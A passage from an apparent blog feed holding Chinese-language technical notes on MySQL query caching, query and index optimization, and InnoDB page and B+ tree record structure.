        <content type="html"><![CDATA[<p><i class="fa fa-quote-left"></i> 查询性能优化的关键之一 <i class="fa fa-quote-right"></i></p><a id="more"></a><h3 id="什么是查询缓存"><a href="#什么是查询缓存" class="headerlink" title="什么是查询缓存"></a>什么是查询缓存</h3><p>MySQL查询缓存保存查询返回的完整结果，当查询命中该缓存，MySQL会立刻返回结果，跳过了解析、优化和执行阶段</p><h3 id="缓存命中"><a href="#缓存命中" class="headerlink" title="缓存命中"></a>缓存命中</h3><p>MySQL判断缓存命中的方法很简单，缓存放在一个引用表中，通过一个哈希值引用，这个哈希值包括了如下因素：</p><ul><li>查询本身</li><li>当前要查询的数据库</li><li>客户端协议的版本等一些其他可能会影响返回结果的信息</li></ul><p>当判断缓存是否命中时，MySQL不会解析“正规化”或者参数化查询语句，而是直接使用SQL语句和客户端发送过来的其他原始信息。任何字符上的不同，例如空格、注释——都会导致缓存的不命中。</p><p><strong>未命中的可能情况</strong>：</p><ul><li>由于查询语句中包含不确定的函数，或者查询结果太大，超过query_cache_limit的值，查询语句无法被缓存</li><li>查询语句之前从未执行过，查询结果没有缓存过</li><li>之前缓存了查询结果，但是由于查询缓存内存不足，MySQL将某些缓存逐出，导致未命中</li><li>查询缓存还没有完成预热，MySQL还没有机会将查询结果都缓存起来</li><li>缓存失效操作太多了，数据修改，内存不足，缓存碎片都会导致缓存失效</li></ul><p><strong>不会缓存结构的情况</strong>：</p><ul><li>当查询语句中有一些不确定的数据时，则不会被缓存，例如包含函数NOW()或者CURRENT_DATE()的查询不会被缓存，只要包含任何用户自定义函数、存储函数、用户变量、临时表、mysql库中的系统表，或者任何包含列级别权限的表，都不会被缓存</li><li>当查询的结果大于query_cache_limit设置的值时，结果不会被缓存。</li><li>对于InnoDB引擎来说，当一个语句在事务中修改了某个表，那么在这个事务提交之前，所有与这个表相关的查询都无法被缓存。因此长时间执行事务，会大大降低缓存命中率。</li></ul><h3 id="额外消耗"><a href="#额外消耗" class="headerlink" title="额外消耗"></a>额外消耗</h3><p>打开查询缓存对读和写操作都会带来额外的消耗：</p><ul><li>读查询在开始之前必须先检查是否命中缓存</li><li>如果这个读查询可以被缓存，那么当完成执行后，MySQL若发现查询缓存中没有这个查询，会将其结果存入查询缓存，这会带来额外的系统消耗</li><li>当向某个表写入数据的时候，MySQL必须将对应表的所有缓存都设置失效，如果查询缓存非常大或者碎片很多，这个操作就可能会带来很大系统消耗</li></ul><p>但对于需要消耗大量资源的查询通常都是非常适合缓存的。</p><h3 id="缓存参数配置："><a href="#缓存参数配置：" class="headerlink" title="缓存参数配置："></a>缓存参数配置：</h3><ul><li>query_cache_type，是否打开查询缓存</li><li>query_cache_size，查询缓存使用的总内存空间</li><li>query_cache_min_res_unit，在查询缓存中分配内存块时的最小单位，可以帮助减少由碎片导致的内存空间浪费</li><li>query_cache_limit，MySQL能够缓存的最大查询结果</li><li>query_cache_wlock_invalidate，如果某个数据表被其他的连接锁住，是否仍然从查询缓存中返回结果</li></ul><h3 id="InnoDB和查询缓存"><a href="#InnoDB和查询缓存" class="headerlink" title="InnoDB和查询缓存"></a>InnoDB和查询缓存</h3><ul><li>事务是否可以访问查询缓存取决于当前事务ID，以及对应的数据表上是否有锁</li><li>如果表上有任何的锁，那么对这个表的任何查询语句都是无法被缓存的</li></ul><h3 id="通用查询缓存优化："><a href="#通用查询缓存优化：" class="headerlink" title="通用查询缓存优化："></a>通用查询缓存优化：</h3><ul><li>用多个小表代替一个大表对查询缓存有好处</li><li>批量写入时只需要做一次缓存失效，所以相比单条写入效率更好</li><li>因为缓存空间太大，在过期操作的时候可能会导致服务器僵死，控制缓存空间的大小</li><li>无法在数据库或者表级别控制查询缓存，但是可以通过SQL_CACHE和SQL_NO_CACHE来控制某个SELECT语句是否需要进行缓存</li><li>对于 写密集型的应用来说，直接禁用查询缓存可能会提高系统的性能</li><li>因为对互斥信号量的竞争，有时直接关闭查询缓存对读密集型的应用也会有好处</li></ul>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MySQL </tag>
            
            <tag> 数据库 </tag>
            
            <tag> 数据库优化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL优化之查询性能优化</title>
      <link href="/2018/09/01/2018-09-01-MySQL%E4%BC%98%E5%8C%96%E4%B9%8B%E6%9F%A5%E8%AF%A2%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/"/>
      <url>/2018/09/01/2018-09-01-MySQL%E4%BC%98%E5%8C%96%E4%B9%8B%E6%9F%A5%E8%AF%A2%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<p><i class="fa fa-quote-left"></i> 绝大多数读场景的优化 <i class="fa fa-quote-right"></i></p><a id="more"></a><h3 id="为什么查询速度会慢"><a href="#为什么查询速度会慢" class="headerlink" title="为什么查询速度会慢"></a>为什么查询速度会慢</h3><ol><li>如果要优化查询，实际上要优化其子任务，要么消除其中一些子任务，要么减少子任务的执行次数，要么让子任务运行得更快</li><li>查询的生命周期大致可以按照顺序来看：从客户端，到服务器，然后在服务器上进行解析，生成执行计划，执行，并返回结果给客户端</li></ol><h3 id="慢查询优化：优化数据访问"><a href="#慢查询优化：优化数据访问" class="headerlink" title="慢查询优化：优化数据访问"></a>慢查询优化：优化数据访问</h3><ol><li>两个分析步骤：<ul><li>确认应用程序是否在检索大量超过需要的数据</li><li>确认MySQL服务器层是否在分析大量超过需要的数据行</li></ul></li><li>是否向数据库请求了不需要的数据<ul><li>查询不需要的记录</li><li>多表关联并返回全部列</li><li>总是取出全部列</li><li>重复查询相同的数据</li></ul></li><li>MySQL是否在扫描额外的记录<ul><li>查询开销三个指标：响应时间、扫描的行数、返回的行数</li><li>响应时间：服务时间和排队时间之和，“快速上限估计”法</li><li>扫描的行数：较短的行的访问速度更快，内存中的行也比磁盘中的行的访问 速度要快得多</li><li>访问类型：EXPLAIN中的type列反应了访问类型；通过增加合适的索引；</li><li>三种方式应用WHERE条件：在索引中使用WHERE条件来过滤不匹配的记录；使用索引覆盖扫描（Extra中出现Using index）来返回记录，直接从索引中过滤不需要的记录并返回命中结果；从数据表中返回数据，然后过滤不满足条件的记录（Extra中出现Using Where）</li><li>需要扫描大量数据但只返回少数的行的优化技巧：使用索引覆盖扫描，改变库表结构，重写复杂的查询</li></ul></li></ol><h3 id="重构查询的方式"><a href="#重构查询的方式" class="headerlink" title="重构查询的方式"></a>重构查询的方式</h3><ol><li><p>MySQL从设计上让连接和断开连接都很轻量级，在返回一个小的查询结果方面很高效</p></li><li><p>切分查询，将大查询切分成小查询，每个查询功能完全一样，只完成一小部分，每次只返回一小部分查询结果，可以避免锁住很多数据、占满事务日志、耗尽系统资源、阻塞很多小的但重要的查询</p></li><li><p>分解关联查询优势：</p><ul><li>让缓存的效率更高</li><li>将查询分解后，执行单个查询可以减少锁的竞争</li><li>在应用层做关联，可以更容易对数据库进行拆分，更容易做到高性能和可扩展</li><li>查询本身效率也可能会有所提升</li><li>可以减少冗余记录的查询</li><li>相当于在应用中实现了哈希关联，而不是使用MySQL的嵌套循环关联</li></ul></li><li><p>分解关联查询的场景：</p><ul><li>当应用能够方便地缓存单个查询的结果的时候</li><li>当可以将数据分布到不同的MySQL服务器上的时候</li><li>当能够使用IN()的方式代替关联查询的时候</li><li>当查询中使用同一个数据表的时候</li></ul></li></ol><h3 id="查询执行的基础"><a href="#查询执行的基础" class="headerlink" title="查询执行的基础"></a>查询执行的基础</h3><ol><li><p>查询执行路径</p><ul><li>客户端发送一条查询给服务器</li><li>服务器先检查查询缓存，如果命中则立刻返回，否则进入下一阶段</li><li>服务器端进行SQL解析、预处理，再由优化器生成对应的执行计划</li><li>MySQL根据优化器生成的执行计划，调用存储引擎的API来执行查询</li><li>将结果返回给客户端</li></ul></li><li><p>MySQL客户端和服务器之间的通信协议是“半双工”的，无法将一个消息切成小块独立来发送，没法进行流量控制，一旦一端开始发生消息，另一端要接收完整个消息才能响应它</p></li><li><p>MySQL通常需要等所有的数据都已经发送给客户端才能释放这条查询所占用的资源，所以接收全部结果并缓存通常可以减少服务器的压力</p></li><li><p>查询状态，SHOW FULL PROCESSLIST命令查看：</p><ul><li>Sleep，线程正在等待客户端发送新的请求</li><li>Query，线程正在执行查询或者正在将结果发送给客户端</li><li>Locked，在MySQL服务器层，该线程正在等待表锁</li><li>Analyzing and statistics，线程正在收集存储引擎的统计信息，并生成查询的执行计划</li><li>Copying to tmp table [on disk]，线程正在执行查询，并且将其结果集都复制到一个临时表中，要么是在做GROUP BY操作，要么是文件排序操作，或者是UNION操作</li><li>Sorting result，线程正在对结果集进行排序</li><li>Sending data，线程可能在多个状态之间传送数据，或者在生成结果集，或者在向客户端返回数据</li></ul></li><li><p>语法解析器和预处理，通过关键字将SQL语句进行解析，并生成一棵对应的“解析树”，解析器将使用MySQL语法规则验证和解析查询，预处理器则根据一些MySQL规则进一步检查解析树是否合法</p></li><li><p>查询优化器，找到最好的执行计划，使用基本成本的优化器，将尝试预测一个查询使用某种执行计划时的成本，并选择其中成本最小的一个，使用SHOW STATUS LIKE ‘Last_query_cost’;查看需要多少个数据页的随机查找</p></li><li><p>导致MySQL查询优化器选择错误的原因：</p><ul><li>统计信息不准确，Innodb不能维护一个数据表的行数的精确统计信息</li><li>执行计划中的成本估算不等同于实际执行的成本</li><li>MySQL的最优可能和你想的最优不一样</li><li>MySQL从不考虑其他并发执行的查询</li><li>MySQL也并不是任何时候都是基于成本的优化</li><li>MySQL不会考虑不受其控制的操作的成本</li><li>优化器有时候无法去估算所有可能的执行计划</li></ul></li><li><p>MySQL能处理的优化类型：</p><ul><li>重新定义关联表的顺序</li><li>将外链接转化成内链接</li><li>使用等价变换规则</li><li>优化COUNT()、MIN()和MAX()，在EXPLAIN中可以看到“Select tables optimized away”</li><li>预估并转化为常数表达式，当检测到一个表达式可以转化为常数的时候，就会一直把该表达式作为常数进行优化处理</li><li>覆盖索引扫描，当索引中的列包含所有查询中需要使用的列的时候，就可以使用索引返回需要的数据，而无须查询对应的数据行</li><li>子查询优化</li><li>提前终止查询，在发现已经满足查询需求的时候，MySQL总是能够立刻终止查询</li><li>等值传播，如果两个列的值通过等式关联，那么MySQL能够把其中一个列的WHERE条件传递到另一列上</li><li>列表IN()的比较，MySQL将IN()列表中的数据先进行排序，然后通过二分查找的方式来确定列表中的值是否满足条件</li></ul></li><li><p>在服务器层有查询优化器，却没有保存数据和索引的统计信息，统计信息由存储引擎实现，不同的存储引擎可能会存储不同的统计信息</p></li><li><p>在MySQL中，每一个查询，每一个片段（包括子查询，甚至基于单表的SELECT）都可能是关联</p></li><li><p>对于UNION查询，MySQL先将一系列的单个查询结果放到一个临时表中，然后再重新读出临时表数据来完成UNION查询</p></li><li><p>MySQL对任何关联都执行“嵌套循环关联”操作，即MySQL先在一个表中循环取出单条数据，然后再嵌套到下一个表中寻找匹配的行，依次下去，直到找到所有表中匹配的行为止</p></li><li><p>全外连接就无法通过嵌套循环和回溯的方式完成，当发现关联表中没有找到任何匹配行的时候，则可能是因为关联恰好从一个没有任何匹配的表开始，MySQL不支持全外连接</p></li><li><p>关联查询优化器，会尝试在所有的关联顺序中选择一个成本最小的来生成执行计划树，如果可能，优化器会遍历每一个表然后逐个做嵌套循环计算每一棵可能的执行树的成本，最后返回一个最优的执行计划</p></li><li><p>如果有超过n个表的关联，那么需要检查n的阶乘关联顺序，称为“搜索空间”，搜索空间的增长速度非常快</p></li><li><p>无论如何排序都是一个成本很高的操作，所以从性能角度考虑，应尽可能避免排序或者尽可能避免对大量数据进行排序</p></li><li><p>当不能使用索引生成排序结果的时候，MySQL需要自己进行排序，如果数据量小则在内存中进行，如果数据量大则需要使用磁盘，MySQL将这个过程称为文件排序（filesort），即使完全是内存排序不需要任何磁盘文件时也是如此</p></li></ol><h3 id="MySQL查询优化器的局限性"><a href="#MySQL查询优化器的局限性" class="headerlink" title="MySQL查询优化器的局限性"></a>MySQL查询优化器的局限性</h3><ol><li>关联子查询：MySQL的子查询实现得非常糟糕，最糟糕的一类查询是WHERE条件中包含IN()的子查询语句，使用GROUP_CONCAT()在IN()中构造一个由逗号分隔的列表，或者使用EXISTS()来改写</li><li>UNION的限制：有时，MySQL无法将限制条件从外层“下推”到内层，这使得原本能够限制部分返回结果的条件无法应用到内层查询的优化上</li><li>MySQL无法利用多核特性来并行执行查询</li><li>MySQL不支持哈希关联，MariaDB已经实现了哈希关联</li><li>MySQL不支持松散索引扫描，5.0后版本在分组查询中需要找到分组的最大值和最小值时可以使用松散索引扫描</li><li>对于MIN()和MAX()查询，MySQL的优化做得并不好</li></ol><h3 id="查询优化器的提示（hint）"><a href="#查询优化器的提示（hint）" class="headerlink" title="查询优化器的提示（hint）"></a>查询优化器的提示（hint）</h3><ol><li>HIGH_PRIORITY和LOW_PRIORITY，当多个语句同时访问某一个表的时候，哪些语句的优先级相对高些、哪些语句的优先级相对低些</li><li>DELAYED，对INSERT和REPLACE有效，会将使用该提示的语句立即返回给客户端，并将插入的行数据放入到缓冲区，然后在表空闲时批量将数据写入，并不是所有的存储引擎都支持，并且该提示会导致函数LAST_INSERT_ID()无法正常工作</li><li>STRAIGHT_JOIN，可以放置在SELECT语句的SELECT关键字之后，也可以放置在任何两个关联表的名字之间。第一个用法是让查询中所有的表按照在语句中出现的顺序进行关联，第二个用法则是固定其前后两个表的关联顺序</li><li>SQL_SMALL_RESULT和SQL_BIG_RESULT，只对SELECT语句有效，它们告诉优化器对GROUP BY或者DISTINCT查询如何使用临时表及排序</li><li>SQL_BUFFER_RESULT，告诉优化器将查询结果放入到一个临时表，然后尽可能快地释放表锁</li><li>SQL_CACHE和SQL_NO_CACHE，告诉MySQL这个结果集是否应该缓存在查询缓存中</li><li>SQL_CALC_FOUND_ROWS，会计算除去LIMIT子句后这个查询要返回的结果集的总数，而实际上只返回LIMIT要求的结果集，可以通过函数FOUND_ROW()获得这个值</li><li>FOR UPDATE和LOCK IN SHARE MODE，主要控制SELECT语句的锁机制，但只对实现了行级锁的存储引擎有效，仅InnoDB支持</li><li>USE INDEX、IGNORE INDEX和FORCE INDEX，告诉优化器使用或者不使用哪些索引来查询记录</li><li>MySQL5.0后新增的用来控制优化器行为的参数：<ul><li>optimizer_search_depth，控制优化器在穷举执行时的限度</li><li>optimizer_prune_level，让优化器会根据需要扫描的行数来决定是否跳过某些执行计划</li><li>optimizer_switch，包含了一些开启/关闭优化器特性的标志位</li></ul></li></ol><h3 id="优化特定类型的查询"><a href="#优化特定类型的查询" class="headerlink" title="优化特定类型的查询"></a>优化特定类型的查询</h3><ol><li>优化COUNT()查询<ul><li>COUNT()是一个特殊的函数，有两种非常不同的作用：可以统计某个列值的数量，也可以统计行数，在统计列值时要求列值是非空的（不统计NULL）</li><li>COUNT(<em>)并不是会像我们猜想的那样扩展成所有的列，实际上，它会忽略所有的列而直接统计所有的行数，当MySQL确认括号内的表达值不可能为空时，实际上就是在统计行数</em></li><li><em>MyISAM的COUNT()函数只有没有任何WHERE条件下的COUNT(</em>)才非常快</li><li>使用近似值，如EXPLAIN出来的优化器估算行数</li><li>使用索引覆盖</li><li>使用汇总表</li><li>使用外部缓存系统</li></ul></li><li>优化关联查询<ul><li>确保ON或者USING子句中的列上有索引</li><li>确保任何的GROUP BY和ORDER BY中的表达式只涉及到一个表中的列</li><li>当升级MySQL的时候需要注意：关联语法、运算符优先级等其他可能会发生变化的地方</li></ul></li><li>优化子查询：尽可能使用关联查询代替，如果使用MySQL5.6以上或MariaDB则可以忽略这个建议</li><li>优化GROUP BY和DISTINCT<ul><li>使用索引优化</li><li>当无法使用索引时，GROUP BY使用两种策略来完成：使用临时表或者文件排序来做分组</li><li>尽可能的将WITH ROLLUP（超级聚合）功能移动应用程序中处理</li></ul></li><li>优化LIMIT分页<ul><li>最简单的办法是尽可能地使用索引覆盖扫描，而不是查询所有的列，然后根据需要做一次关联操作再返回所需的列，select id,name,…… from table innert join (select id from table order by xxx limit 5000,5) as table1 USING(id);</li><li>offset会导致MySQL扫描大量不需要的行然后再抛弃掉，如果可以记录上次取数据的位置，下次就可以直接从该记录的位置开始扫描，可以避免使用offset</li><li>使用预先计算的汇总表，或者关联到一个冗余表</li></ul></li><li>优化UNION查询<ul><li>通过创建并填充临时表的方式来执行UNION查询，因此很多优化策略在UNION查询中都没法很好地使用，经常需要手工地将WHERE、LIMIT、ORDER BY等子句下推到UNION的各个子查询中</li><li>除非确实需要服务器消除重复的行，否则就一定要使用UNION ALL</li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MySQL </tag>
            
            <tag> 数据库 </tag>
            
            <tag> 数据库优化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL优化之创建高性能索引</title>
      <link href="/2018/08/31/2018-08-31-MySQL%E4%BC%98%E5%8C%96%E4%B9%8B%E5%88%9B%E5%BB%BA%E9%AB%98%E6%80%A7%E8%83%BD%E7%B4%A2%E5%BC%95/"/>
      <url>/2018/08/31/2018-08-31-MySQL%E4%BC%98%E5%8C%96%E4%B9%8B%E5%88%9B%E5%BB%BA%E9%AB%98%E6%80%A7%E8%83%BD%E7%B4%A2%E5%BC%95/</url>
      
        <content type="html"><![CDATA[<p><i class="fa fa-quote-left"></i> 优化第一步，创建高性能索引 <i class="fa fa-quote-right"></i></p><a id="more"></a><h3 id="索引基础"><a href="#索引基础" class="headerlink" title="索引基础"></a>索引基础</h3><ol><li><p>索引可以包含一个或多个列的值，如果索引包含多个列，那么列的顺序也十分重要，因为MySQL只能高效地使用索引的最左前缀列。</p></li><li><p>ORM工具能够产生符合逻辑的、合法的查询，除非只是生成非常基本的查询，否则它很难生成适合索引的查询。</p></li><li><p>在MySQL中，索引是在存储引擎层而不是服务器层实现的，所以，并没有统一的索引标准：不同存储引擎的索引的工作方式并不一样，也不是所有的存储引擎都支持所有类型的索引。</p></li><li><p>B-Tree意味着所有的值都是按顺序存储的，并且每一个叶子页到根的距离相同，能够加快访问数据的速度，从索引的根节点开始进行搜索，适用于全键值、键值范围或键前缀查找。</p><img src="/2018/08/31/2018-08-31-MySQL优化之创建高性能索引/pic1.png"></li><li><p>B-Tree索引的限制：</p><ul><li>如果不是按照索引的最左列开始查找，则无法使用索引</li><li>不能跳过索引中的列</li><li>如果查询中有某个列的范围查询，则其右边所有列都无法使用索引优化查找</li></ul></li><li><p>哈希索引（hash index）基于哈希表实现，只有精确匹配索引所有列的查询才有效，只有Memory引擎显式支持哈希索引。</p></li><li><p>哈希索引的限制：</p><ul><li>哈希索引只包含哈希值和行指针，而不存储字段值，所以不能使用索引中的值来避免读取行</li><li>哈希索引数据并不是按照索引值顺序存储的，所以也就无法用于排序</li><li>哈希索引也不支持部分索引列匹配查找，因为哈希索引始终是使用索引列的全部内容来计算哈希值的</li><li>只支持等值比较查询，不支持任何范围查询</li><li>访问哈希索引的数据非常快，除非有很多哈希冲突</li><li>如果哈希冲突很多的话，一些索引维护操作的代价也会很高</li></ul></li><li><p>空间数据索引（R-Tree），MyISAM表支持空间索引，可以用作地理数据存储，开源数据库系统中对GIS的解决方案做得比较好的是PostgreSQL的PostGIS。</p></li><li><p>全文索引，适用于MATCH AGAINST操作，而不是普通的WHERE条件操作。</p></li></ol><h3 id="索引优点"><a href="#索引优点" class="headerlink" title="索引优点"></a>索引优点</h3><ol><li>三个优点：<ul><li>索引大大减少了服务器需要扫描的数据量</li><li>索引可以帮助服务器避免排序和临时表</li><li>索引可以将随机I/O变为顺序I/O</li></ul></li><li>索引三星系统：<ul><li>索引将相关的记录放到一起则获得一星</li><li>如果索引中的数据顺序和查找中的排序一致则获得二星</li><li>如果索引中的列包含了查询中需要的全部列则获得三星</li></ul></li></ol><h3 id="高性能索引策略"><a href="#高性能索引策略" class="headerlink" title="高性能索引策略"></a>高性能索引策略</h3><ol><li>独立的列：如果查询中的列不是独立的，则MySQL不会使用索引。“独立的列”是指索引列不能是表达式的一部分，也不能是函数的参数</li><li>前缀索引和索引选择性：<ul><li>通常可以索引开始的部分字符，可以大大节约索引空间，但也会降低索引的选择性</li><li>索引的选择性是指，不重复的索引值（也称为基数，cardinality）和数据表的记录总数（#T）的比值，范围从1/#T到1之间，选择性越高则查询效率越高，因为选择性高的索引可以让MySQL在查找时过滤掉更多的行</li><li>MySQL无法使用前缀索引做ORDERY BY和GROUP BY，也无法做覆盖扫描</li></ul></li><li>选择合适的索引列顺序：<ul><li>正确的索引列顺序依赖于使用该索引的查询，并且同时需要考虑如何更好地满足排序和分组的需要</li><li>在一个多列B-Tree索引中，索引列的顺序意味着索引首先按照最左列进行排序，其次是第二列</li><li>将选择性最高的列放到索引最前列</li></ul></li><li>聚簇索引（并不是一种单独的索引类型，而是一种数据存储方式）<ul><li>最好避免随机的（不连续且值的分布范围非常大）聚簇索引，特别是对于I/O密集型的应用</li></ul></li><li>覆盖索引：如果一个索引包含（或者说覆盖）所有需要查询的字段的值，就称为覆盖索引<ul><li>覆盖索引必须要存储索引列的值</li></ul></li><li>如果EXPLAIN出来的type列的值为“index”，则说明MySQL使用了索引扫描来做排序</li><li>压缩（前缀）索引，默认只压缩字符串，减少索引大小，对于CPU密集型应用，因为扫描需要随机查找，压缩索引在MyISAM上要慢好几倍</li><li>重复索引是指在相同的列上按照相同的顺序创建的相同类型的索引，应该避免这样创建重复索引</li><li>索引可以让查询锁定更少的行</li></ol><h4 id="维护索引和表"><a href="#维护索引和表" class="headerlink" title="维护索引和表"></a>维护索引和表</h4><ol><li>CHECK TABLE检查表是否损坏，ALTER TABLE innodb_tb1 ENGINE=INNODB;修复表</li><li>records_in_range()通过向存储引擎传入两个边界值获取在这个范围大概有多少条记录，对于innodb不精确</li><li>info()返回各种类型的数据，包括索引的基数</li><li>可以使用SHOW INDEX FROM命令来查看索引的基数</li><li>B-Tree索引可能会碎片化，这会降低查询的效率</li></ol>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MySQL </tag>
            
            <tag> 数据库 </tag>
            
            <tag> 索引 </tag>
            
            <tag> 数据库优化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>InnoDB的Page结构</title>
      <link href="/2018/08/21/2018-08-21-InnoDB%E7%9A%84Page%E7%BB%93%E6%9E%84/"/>
      <url>/2018/08/21/2018-08-21-InnoDB%E7%9A%84Page%E7%BB%93%E6%9E%84/</url>
      
        <content type="html"><![CDATA[<p><i class="fa fa-quote-left"></i> 深入InnoDB底层实现 <i class="fa fa-quote-right"></i></p><a id="more"></a><h3 id="What-is-Page？"><a href="#What-is-Page？" class="headerlink" title="What is Page？"></a>What is Page？</h3><p>理解InnoDB的实现不得不提Page结构，Page是整个InnoDB存储的最基本构件，也是InnoDB磁盘管理的最小单位，与数据库相关的所有内容都存储在这种Page结构里。</p><p>Page分为几种类型，常见的页类型有数据页（B-tree Node）、Undo页（Undo Log Page）、系统页（System Page） 、事务数据页（Transaction System Page）等。单个Page的大小是16K（编译宏UNIV_PAGE_SIZE控制），每个Page使用一个32位的int值来唯一标识，这也正好对应InnoDB最大64TB的存储容量（16Kib * 2^32 = 64Tib）。</p><h3 id="Page结构"><a href="#Page结构" class="headerlink" title="Page结构"></a>Page结构</h3><h4 id="基本结构"><a href="#基本结构" class="headerlink" title="基本结构"></a>基本结构</h4><p>一个Page的基本结构如下图所示：</p><img src="/2018/08/21/2018-08-21-InnoDB的Page结构/pic1.png"><p>每个Page都有通用的头和尾，但是中部的内容根据Page的类型不同而发生变化。</p><h4 id="头部"><a href="#头部" class="headerlink" title="头部"></a>头部</h4><p>Page的头部里有我们关心的一些数据，下图把Page的头部详细信息显示出来：</p><img src="/2018/08/21/2018-08-21-InnoDB的Page结构/pic2.png"><p>我们重点关注和数据组织结构相关的字段：Page的头部保存了两个指针，分别指向前一个Page和后一个Page，头部还有Page的类型信息和用来唯一标识Page的编号。</p><p>根据这两个指针我们很容易想象出Page链接起来就是一个双向链表的结构：</p><img src="/2018/08/21/2018-08-21-InnoDB的Page结构/pic3.png"><h4 id="主体"><a href="#主体" class="headerlink" title="主体"></a>主体</h4><p>再看看Page的主体内容：</p><img src="/2018/08/21/2018-08-21-InnoDB的Page结构/pic4.png"><p>我们主要关注行数据和索引的存储，他们都位于Page的User Records部分。</p><h5 id="User-Records"><a href="#User-Records" class="headerlink" title="User Records"></a>User Records</h5><p>User Records占据Page的大部分空间，User Records由一条一条的Record组成，每条记录代表索引树上的一个节点（非叶子节点和叶子节点）。在一个Page内部，单链表的头尾由固定内容的两条记录来表示，字符串形式的”Infimum”代表开头，”Supremum”代表结尾。这两个用来代表开头结尾的Record存储在System Records的段里，这个System Records和User Records是两个平行的段。</p><p>InnoDB存在4种不同的Record，它们分别是：</p><ul><li>主键索引树非叶节点 </li><li>主键索引树叶子节点 </li><li>辅助键索引树非叶节点</li><li>辅助键索引树叶子节点</li></ul><p>这4种节点的Record格式有一些差异，但是它们都存储着Next指针指向下一个Record。后续我们会详细介绍这4种节点，现在只需要把Record当成一个存储了数据同时含有Next指针的单链表节点即可。</p><p>User Record在Page内以单链表的形式存在，最初数据是按照插入的先后顺序排列的，但是随着新数据的插入和旧数据的删除，数据物理顺序会变得混乱，但他们依然保持着逻辑上的先后顺序。如下图：</p><img src="/2018/08/21/2018-08-21-InnoDB的Page结构/pic5.png"><p>把User Record的组织形式和若干Page组合起来，就看到了稍微完整的形式：</p><img src="/2018/08/21/2018-08-21-InnoDB的Page结构/pic6.png"><h5 id="如何定位一个Record"><a href="#如何定位一个Record" class="headerlink" title="如何定位一个Record"></a>如何定位一个Record</h5><ol><li>通过根节点开始遍历一个索引的B+树，通过各层非叶子节点最终到达一个Page，这个Page里存放的都是叶子节点。</li><li>在Page内从”Infimum”节点开始遍历单链表（这种遍历往往会被优化），如果找到该键则成功返回。如果记录到达了”supremum”，说明当前Page里没有合适的键，这时要借助Page的Next Page指针，跳转到下一个Page继续从”Infimum”开始逐个查找。</li></ol><img src="/2018/08/21/2018-08-21-InnoDB的Page结构/pic7.png"><h5 id="四种record"><a href="#四种record" class="headerlink" title="四种record"></a>四种record</h5><p>详细看下不同类型的Record里到底存储了什么数据，根据B+树节点的不同，User Record可以被分成四种格式。</p><p>下图种按照颜色予以区分：</p><img src="/2018/08/21/2018-08-21-InnoDB的Page结构/pic8.png"><p>主索引树非叶节点（绿色）</p><ul><li>子节点存储的主键里最小的值（Min Cluster Key on Child），这是B+树必须的，作用是在一个Page里定位到具体的记录的位置。</li><li>最小的值所在的Page的编号（Child Page Number），作用是定位Record。</li></ul><p>主索引树叶子节点（黄色）</p><ul><li>主键（Cluster Key Fields），B+树必须的，也是数据行的一部分</li><li>除去主键以外的所有列（Non-Key Fields），这是数据行的除去主键的其他所有列的集合。</li><li>上面两部分加起来就是一个完整的数据行。</li></ul><p>辅助索引树非叶节点非（蓝色）</p><ul><li>子节点里存储的辅助键值里的最小的值（Min Secondary-Key on Child），这是B+树必须的，作用是在一个Page里定位到具体的记录的位置。</li><li>主键值（Cluster Key Fields），非叶子节点为什么要存储主键呢？因为辅助索引是可以不唯一的，但是B+树要求键的值必须唯一，所以这里把辅助键的值和主键的值合并起来作为在B+树中的真正键值，保证了唯一性。但是这也导致在辅助索引B+树中非叶节点反而比叶子节点多了4个字节（即蓝色节点反而比红色多了4字节）。</li><li>最小的值所在的Page的编号（Child Page Number），作用是定位Record。</li></ul><p>辅助索引树叶子节点（红色）</p><ul><li>辅助索引键值（Secondary Key Fields），这是B+树必须的。</li><li>主键值（Cluster Key Fields），用来在主索引树里再做一次B+树检索来找到整条记录。</li></ul><h3 id="主索引树的Page组织结构"><a href="#主索引树的Page组织结构" class="headerlink" title="主索引树的Page组织结构"></a>主索引树的Page组织结构</h3><p>结合B+树的结构和前面介绍的4种Record的内容，我们终于可以画出一幅全景图。</p><p>由于辅助索引的B+树与主键索引有相似的结构，这里只画出了主键索引树的结构图，只包含了<strong>主键非叶节点</strong>和<strong>主键叶子节点</strong>两种节点，也就是上面绿色和黄色的部分。</p><img src="/2018/08/21/2018-08-21-InnoDB的Page结构/pic9.png"><p>把上图还原成下面这个更简洁的树形示意图，这就是B+树的一部分：</p><img src="/2018/08/21/2018-08-21-InnoDB的Page结构/pic10.png"><p>注意Page和B+树节点之间并没有一一对应的关系，Page只是作为一个Record的保存容器，它存在的目的是便于对磁盘空间进行批量管理，上图中的编号为47的Page在树形结构上就被拆分成了两个独立节点。</p>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MySQL </tag>
            
            <tag> 数据库 </tag>
            
            <tag> InnoDB </tag>
            
            <tag> 存储引擎 </tag>
            
            <tag> 数据结构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>InnoDB的主键选择与插入优化</title>
      <link href="/2018/08/20/2018-08-20-InnoDB%E7%9A%84%E4%B8%BB%E9%94%AE%E9%80%89%E6%8B%A9%E4%B8%8E%E6%8F%92%E5%85%A5%E4%BC%98%E5%8C%96/"/>
      <url>/2018/08/20/2018-08-20-InnoDB%E7%9A%84%E4%B8%BB%E9%94%AE%E9%80%89%E6%8B%A9%E4%B8%8E%E6%8F%92%E5%85%A5%E4%BC%98%E5%8C%96/</url>
      
